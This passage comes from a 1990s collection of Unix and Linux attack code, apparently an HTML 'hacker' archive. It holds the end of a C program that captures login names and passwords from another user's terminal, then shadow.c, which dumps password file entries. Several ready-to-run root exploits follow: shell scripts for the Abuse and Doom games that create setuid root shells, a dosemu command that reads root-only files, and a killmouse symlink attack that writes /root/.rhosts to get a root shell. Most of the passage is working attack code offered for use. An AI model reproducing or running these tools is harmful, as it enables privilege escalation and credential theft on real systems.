<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
return(1); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
} <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return(0); <BR>} 
<BR><BR>main(argc,argv) <BR>int argc; <BR>char *argv[]; <BR>{ 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* variables */ 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int err; 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FILE *f; 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char 
*term&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = "12345678901234567890"; 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char 
*login&nbsp;&nbsp;&nbsp;&nbsp; = "12345678901234567890"; 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char *password&nbsp; = 
"12345678901234567890"; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (argc 
&lt; 2) <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Usage: %s /dev/ttyp?\nDon't forget 
to redirect the output to a file !\n",argv[0]); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
printf("Enter ttyname: "); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
gets(term); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else term=argv[argc-1]; 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; signal(SIGQUIT,handler); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; signal(SIGINT,handler); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; signal(SIGTERM,handler); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; signal(SIGHUP,handler); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; signal(SIGTTOU,handler); 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
close(0);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
/* close stdin */ <BR>#ifdef ULTRIX 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(setpgrp(0,100)==-1) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
perror("setpgrp:");&nbsp;&nbsp;&nbsp;&nbsp; /* Hopefully this works */ <BR>#else 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(setsid()==-1) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
perror("setsid:"); /* Disconnect from our controlling TTY and 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
start a new session as sessionleader */ <BR>#endif 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
f=fopen(term,"r");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Open tty as a stream, this 
guarantees 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
; getting file descriptor 0 */ <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if 
(f==NULL) <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Error opening %s with 
fopen()\n",term); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
exit(2); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (DEBUG) system("ps 
-xu&gt;&gt;/dev/null &amp;"); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
fclose(f);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
/* Close the TTY again */ <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
f=fopen("/dev/tty","r");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* We can now 
use /dev/tty instead */ <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if 
(f==NULL) <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Error opening /dev/tty with 
fopen()\n",term); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
exit(2); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(readandpush(f,login)==0) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { <BR>#ifdef USLEEP 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
usleep(20000);&nbsp; /* This gives login(1) a chance to read the 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
string, or the second call would read the 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
input that the first call pushed back ! /* <BR>#else 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
for(i=0;i&lt;1000;i++) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
err=err+(i*i) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
/* error&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Alternatives not yet 
implemented */ <BR>#endif 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
readandpush(f,password); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
printf("Result: First: %s Second: %s\n",login,password); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fflush(stdout); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
sleep(30);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Waste some time, to prevent that we 
send a SIGHUP 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
to login(1), which would kill the user. Instead, 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
wait a while. We then send SIGHUP to the shell of 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
the user, which will ignore it. */ 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fclose(f); <BR>} 
<BR>--------------cut here <BR><BR><A name=7></A><B><FONT size=+1>shadow.c&nbsp; 
- Get Shadow passwd Files</FONT></B>&nbsp; <BR><BR>----------- cut here 
<BR><BR>&nbsp;/*&nbsp; This source will/should print out SHADOWPW passwd 
files.&nbsp;&nbsp; */ <BR>&nbsp; <BR>&nbsp;struct&nbsp; SHADOWPW 
{&nbsp;&nbsp;&nbsp;&nbsp; /* see getpwent(3) */ <BR>&nbsp;&nbsp; char *pw_name; 
<BR>&nbsp;&nbsp; char *pw_passwd; <BR>&nbsp;&nbsp; int&nbsp; pw_uid; 
<BR>&nbsp;&nbsp; int&nbsp; pw_gid; <BR>&nbsp;&nbsp; int&nbsp; pw_quota; 
<BR>&nbsp;&nbsp; char *pw_comment; <BR>&nbsp;&nbsp; char *pw_gecos; 
<BR>&nbsp;&nbsp; char *pw_dir; <BR>&nbsp;&nbsp; char *pw_shell; <BR>&nbsp;}; 
<BR>&nbsp;struct passwd *getpwent(), *getpwuid(), *getpwnam(); <BR>&nbsp; 
<BR>&nbsp;#ifdef&nbsp;&nbsp; elxsis? <BR>&nbsp; <BR>&nbsp;/* Name of the shadow 
password file. Contains password and aging info */ <BR>&nbsp; 
<BR>&nbsp;#define&nbsp; SHADOWPW "/etc/shadowpw" <BR>&nbsp;#define&nbsp; 
SHADOWPW_PAG "/etc/shadowpw.pag" <BR>&nbsp;#define&nbsp; SHADOWPW_DIR 
"/etc/shadowpw.dir" <BR>&nbsp;/* <BR>&nbsp; *&nbsp; Shadow password file 
pwd-&gt;pw_gecos field contains: <BR>&nbsp; * <BR>&nbsp; *&nbsp; 
&lt;type&gt;,&lt;period&gt;,&lt;last_time&gt;,&lt;old_time&gt;,&lt;old_password&gt; 
<BR>&nbsp; * <BR>&nbsp; *&nbsp; &lt;type&gt;&nbsp; = Type of password criteria 
to enforce (type int). <BR>&nbsp; *&nbsp; BSD_CRIT (0), normal BSD. <BR>&nbsp; 
*&nbsp; STR_CRIT (1), strong passwords. <BR>&nbsp; *&nbsp; &lt;period&gt;&nbsp; 
= Password aging period (type long). <BR>&nbsp; *&nbsp; 0, no aging. <BR>&nbsp; 
*&nbsp; else, number of seconds in aging period. <BR>&nbsp; *&nbsp; 
&lt;last_time&gt;&nbsp; = Time (seconds from epoch) of the last password 
<BR>&nbsp; *&nbsp; change (type long). <BR>&nbsp; *&nbsp; 0, never changed.n 
<BR>&nbsp; *&nbsp; &lt;old_time&gt;&nbsp; = Time (seconds from epoch) that the 
current password <BR>&nbsp; *&nbsp; was made the &lt;old_password&gt; (type 
long). <BR>&nbsp; *&nbsp; 0, never changed.ewromsinm <BR>&nbsp; *&nbsp; 
&lt;old_password&gt; = Password (encrypted) saved for an aging &lt;period&gt; to 
<BR>&nbsp; *&nbsp; prevent reuse during that period (type char [20]). <BR>&nbsp; 
*&nbsp; "*******", no &lt;old_password&gt;. <BR>&nbsp; */ <BR>&nbsp; 
<BR>&nbsp;/* number of tries to change an aged password */ <BR>&nbsp; 
<BR>&nbsp;#define&nbsp; CHANGE_TRIES 3 <BR>&nbsp; <BR>&nbsp;/* program to 
execute to change passwords */ <BR>&nbsp; <BR>&nbsp;#define&nbsp; PASSWD_PROG 
"/bin/passwd" <BR>&nbsp; <BR>&nbsp;/* Name of the password aging exempt user 
names and max number of entires */ <BR>&nbsp; <BR>&nbsp;#define&nbsp; EXEMPTPW 
"/etc/exemptpw" <BR>&nbsp;#define MAX_EXEMPT 100 <BR>&nbsp; <BR>&nbsp;/* 
Password criteria to enforce */ <BR>&nbsp; <BR>&nbsp;#define BSD_CRIT 0 /* 
Normal BSD password criteria */ <BR>&nbsp;#define STR_CRIT 1&nbsp; /* Strong 
password criteria */ <BR>&nbsp;#define MAX_CRIT 1 <BR>&nbsp;#endif&nbsp;&nbsp; 
elxsi <BR>&nbsp;#define NULL 0 <BR>&nbsp;main() <BR>&nbsp;{ <BR>&nbsp;struct 
passwd *p; <BR>&nbsp;int i; <BR>&nbsp;for (;1;) {; <BR>&nbsp;&nbsp; 
p=getpwent(); <BR>&nbsp;&nbsp; if (p==NULL) return; <BR>&nbsp;&nbsp; printpw(p); 
<BR>&nbsp;} <BR>&nbsp;} <BR>&nbsp; <BR>&nbsp;printpw(a) <BR>&nbsp;struct 
SHADOWPW *a; <BR>&nbsp;{ <BR>&nbsp;printf("%s:%s:%d:%d:%s:%s:%s\n", 
<BR>&nbsp;&nbsp;&nbsp; a-&gt;pw_name,a-&gt;pw_passwd,a-&gt;pw_uid,a-&gt;pw_gid, 
<BR>&nbsp;&nbsp;&nbsp; a-&gt;pw_gecos,a-&gt;pw_dir,a-&gt;pw_shell); <BR>&nbsp;} 
<BR>&nbsp; <BR>&nbsp;/* SunOS 5.0&nbsp; /etc/shadow */ <BR>&nbsp;/* 
SunOS4.1+c2&nbsp;&nbsp;&nbsp;&nbsp; /etc/security/passwd.adjunct */ <BR>&nbsp; 
<BR>------------ cut here <BR><BR><A name=8></A><B><FONT size=+1>Abuse Root 
Exploit (linux game program)</FONT></B>&nbsp; <BR><BR>---------- cut here 
<BR><BR>There is a security hole in RedHat 2.1, which installs the game abuse, 
<BR>/usr/lib/games/abuse/abuse.console suid root.&nbsp; The abuse.console 
program <BR>loads its files without absolute path names, assuming the user is 
running <BR>abuse from the /usr/lib/games/abuse directory.&nbsp; One of these 
files in the <BR>undrv program, which abuse executes as root.&nbsp; If the user 
is not in the <BR>abuse directory when running this, an arbitrary program can be 
substituted <BR>for undrv, allowing the user to execute arbitrary commands as 
root. <BR>&nbsp;&nbsp; If abuse.console needs to be run by users other than root 
at the console, <BR>provisions need to be made in the code to not execute or 
load any files <BR>as root. 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Program: /usr/lib/games/abuse/abuse.console suid root <BR>Affected Operating 
Systems: Red Hat 2.1 linux distribution 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Requirements: account on system 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Patch: chmod -s /usr/lib/games/abuse/abuse.console 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Security Compromise: root 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Author: Dave M. (davem@cmu.edu) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Synopsis: abuse.console runs undrv without an absolute 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
pathname while executing as root, allowing 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
a user to substitute the real undrv with 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
an arbitrary program. <BR><BR>Exploit: <BR>#!/bin/sh <BR># <BR># abuser.sh <BR># 
exploits a security hole in abuse to create <BR># a suid root shell /tmp/abuser 
on a linux <BR># Red Hat 2.1 system with the games package <BR># installed. 
<BR># <BR># For release 2/2/96 - 1 drink credit please. <BR># <BR># by Dave M. 
(davem@cmu.edu) <BR># <BR>echo ================ abuser.sh - gain root on Linux 
Red Hat 2.1 system <BR>echo ================ Checking system vulnerability 
<BR>if test -u /usr/lib/games/abuse/abuse.console <BR>then <BR>echo 
++++++++++++++++ System appears vulnerable. <BR>cd /tmp <BR>cat &lt;&lt; _EOF_ 
&gt; /tmp/undrv <BR>#!/bin/sh <BR>/bin/cp /bin/sh /tmp/abuser <BR>/bin/chmod 
4777 /tmp/abuser <BR>_EOF_ <BR>cat &lt;&lt; _EOF_ &gt;&gt; /tmp/the_wall <BR>so 
ya thought ya might like to go to the show <BR>to feel the warm thrill of 
confusion that space cadet glow <BR>tell me is something eluding you sunshine? 
<BR>is this not what you expected to see? <BR>if you wanna find out what's 
behind these cold eyes <BR>you'll just have to claw your way through this 
disguise <BR>_EOF_ <BR>chmod +x /tmp/undrv <BR>PATH=/tmp <BR>echo 
================ Executing Abuse <BR>/usr/lib/games/abuse/abuse.console 
<BR>/bin/rm /tmp/undrv <BR>/bin/rm /tmp/the_wall <BR>if test -u /tmp/abuser 
<BR>then <BR>echo ++++++++++++++++ Exploit successful, suid shell located in 
/tmp/abuser <BR>else <BR>echo ---------------- Exploit failed <BR>fi <BR>else 
<BR>echo ---------------- This machine does not appear to be vulnerable. <BR>fi 
<BR>----------- cut here <BR><BR><A name=9></A><B><FONT size=+1>Doom (game) Root 
Exploit - Makes Suid Root Shell</FONT></B>&nbsp; <BR><BR><BR>----------- Start 
reading <BR>From bo@ebony.iaehv.nl Tue Dec 17 18:53:18 1996 <BR>Date: Tue, 17 
Dec 1996 10:18:24 +0100 <BR>From: Bo &lt;bo@ebony.iaehv.nl&gt; <BR>To: Multiple 
recipients of list BUGTRAQ &lt;BUGTRAQ@netspace.org&gt; <BR>Subject: Re: Linux: 
killmouse/doom <BR><BR>&gt; From: Joe Zbiciak 
&lt;im14u2c@cegt201.bradley.edu&gt; <BR>&gt; 
Subject:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Re: Linux: exploit for killmouse. 
<BR>&gt; <BR>&gt; Which reminds me, there's a bigger hole in Doom.&nbsp; It 
doesn't drop its <BR>&gt; root permissions soon enough!&nbsp; The user is 
allowed to set a sound server <BR>&gt; in his/her .doomrc.&nbsp; Normally, this 
is set to "sndserver".&nbsp; Howver, this <BR>&gt; can be set to *any* program, 
and that program runs as root!! <BR><BR>Yes,&nbsp; very true. And just in case 
anybody collects these scripts, here's <BR>the obvious one: <BR><BR>------------ 
CUT HERE -------------- <BR>#!/bin/sh <BR># Tue Dec 17 10:02:20 MET 1996 Bo 
<BR>echo 'sndserver "/tmp/sndserver"' &gt; .doomrc <BR>cat &gt; /tmp/sndserver.c 
&lt;&lt; EOF <BR>#include &lt;stdio.h&gt; <BR>#include &lt;unistd.h&gt; 
<BR>main() { <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (fork()) while 
(getc(stdin)); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else system("cp 
/bin/sh /tmp; chmod +s /tmp/sh"); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
/* or whatever you like to do */ <BR>} <BR>EOF <BR>gcc /tmp/sndserver.c -o 
/tmp/sndserver <BR><BR>------------ CUT HERE -------------- <BR><BR>The&nbsp; 
fork()&nbsp; is&nbsp; just so that doom runs on nicely without locking up the 
<BR>keyboard&nbsp; and&nbsp; sndserver&nbsp; gobbles&nbsp; up all the sound data 
send to it. Run <BR>the script, start sdoom, quit the normal way, and execute 
/tmp/sh. <BR><BR>Thanks for pointing it out, Joe. <BR><BR>Regards, 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Bo. <BR><BR>-- 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
"Heisenberg may have been here". <BR><BR>--------------- end of read <BR><BR><A 
name=10></A><B><FONT size=+1>Dosmenu Suid Root Exploit</FONT></B>&nbsp; 
<BR><BR><BR>--------- read <BR><BR>In Debian 1.1, the optional DOSEMU package 
installs /usr/sbin/dos <BR>setuid root.&nbsp; This is a serious security hole 
which can be exploited <BR>to gain access to any file on the system. 
<BR><BR>Package: dosemu <BR>Version: 0.64.0.2-9 <BR><BR>------- start of cut 
text -------------- <BR><BR>$ cat /etc/debian_version <BR>1.1 <BR>$ id 
<BR>uid=xxxx(quinlan) gid=xxxx(quinlan) 
groups=xxxx(quinlan),20(dialout),24(cdrom) <BR>[quinlan:~]$ ls -al /usr/bin/dos 
<BR>-rwsr-xr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; 
root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 569576 Oct 24 00:05 /usr/bin/dos <BR>$ 
ls -al /root/foo <BR>-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; 
root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1117 Nov 13 23:10 /root/foo 
<BR>$ dos -F /root/foo <BR>[ Prints /root/foo, which is not readable by user 
`quinlan'. ] <BR><BR>------- Cut here <BR><BR>I expect there may be other holes 
in dosemu other than this one that <BR>can be exploited if it is installed 
setuid root.&nbsp; It took about 60 <BR>seconds to find this hole once I 
realized /usr/bin/dos was setuid <BR>root. <BR><BR>Dan <BR><BR>Note: This 
security hole can be corrected by removing the suid bit from <BR>/usr/bin/dos: 
<BR>---------------------------- <BR>$ chmod u-s /usr/bin/dos 
<BR>---------------------------- <BR><BR>Jonathan <BR><BR>----------- end of 
read <BR><BR><A name=11></A><B><FONT size=+1>Doom Root killmouse 
Exploit</FONT></B>&nbsp; <BR><BR>System: <BR>Probably&nbsp; Linux&nbsp; 
specific.&nbsp; Slackware&nbsp; 3.0 (installs Linux 1.2.13) which <BR>have&nbsp; 
gpm&nbsp; utility&nbsp; and/or&nbsp; the&nbsp; Doom&nbsp; package installed are 
vulnerable. <BR>Other distributions might be too. <BR><BR>Impact: <BR>Local 
users can acquire root status. <BR><BR>Background: <BR>The&nbsp; problem&nbsp; 
is&nbsp; the&nbsp; killmouse/startmouse command that is part of Doom 
<BR>package&nbsp; on&nbsp; Linux&nbsp; systems.&nbsp; It&nbsp; is&nbsp; actually 
a C-wrapper that runs two <BR>scripts&nbsp; (killmouse.sh/startmouse.sh). It 
runs suid root. <BR><BR>Problem: <BR>I would try to describe the problem but I 
can't stop laughing. <BR><BR>Exploit: <BR>This&nbsp; can&nbsp; be&nbsp; 
exploited&nbsp; in&nbsp; a few similar ways. Here's just one. Let's 
<BR>assume&nbsp; the&nbsp; gpm&nbsp; utility is not running. We can't start it 
up ourselves <BR>as gpm is only to be run by root. So we'll use startmouse to 
fire it up: <BR><BR>$ touch /tmp/gpmkilled <BR>$ /usr/games/doom/startmouse 
<BR><BR>ps -aux | grep gpm <BR>bo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
1436&nbsp; 0.0&nbsp; 2.0&nbsp;&nbsp; 40&nbsp; 312 v03 R&nbsp;&nbsp;&nbsp; 
16:33&nbsp;&nbsp; 0:00 grep gpm <BR>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
1407&nbsp; 0.0&nbsp; 2.4&nbsp;&nbsp; 42&nbsp; 368&nbsp; ?&nbsp; 
S&nbsp;&nbsp;&nbsp; 16:24&nbsp;&nbsp; 0:00 /usr/bin/gpm t ms <BR><BR>Fine,&nbsp; 
it's&nbsp; running.&nbsp; Now&nbsp; we'll use killmouse to kill the process, but 
<BR>first we set our umask to 0 and link /tmp/gpmkilled to /root/.rhosts: 
<BR><BR>$ umask 0 <BR>$ ln -s /root/.rhosts /tmp/gpmkilled <BR>$ 
/usr/games/doom/killmouse <BR>&nbsp;1407&nbsp; ?&nbsp; S&nbsp;&nbsp;&nbsp;&nbsp; 
0:00 gpm t ms <BR><BR>$ ls -l /root/.rhosts <BR>-rw-rw-rw-&nbsp;&nbsp; 1 
root&nbsp;&nbsp;&nbsp;&nbsp; 
users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 Dec 13 16:44 
/root/.rhosts <BR><BR>$ echo localhost bo &gt; /root/.rhosts <BR>$ rsh -l root 
localhost sh -i <BR>bash# <BR><BR>Bingo.&nbsp; On&nbsp; some&nbsp; systems gpm 
might not be started in /etc/rc.d/rc.local <BR>so&nbsp; the&nbsp; 
startmouse&nbsp; script will fail. But gpm might be running already. 
<BR>If&nbsp; neither of these conditions are met, note that startmouse.sh 
creates <BR>/tmp/gpmscript&nbsp; and runs it in a shell. There's a window of 
time between <BR>creating&nbsp; the&nbsp; script and executing it, so we have a 
nice race condition <BR>here; it can be replaced with anything you like prior to 
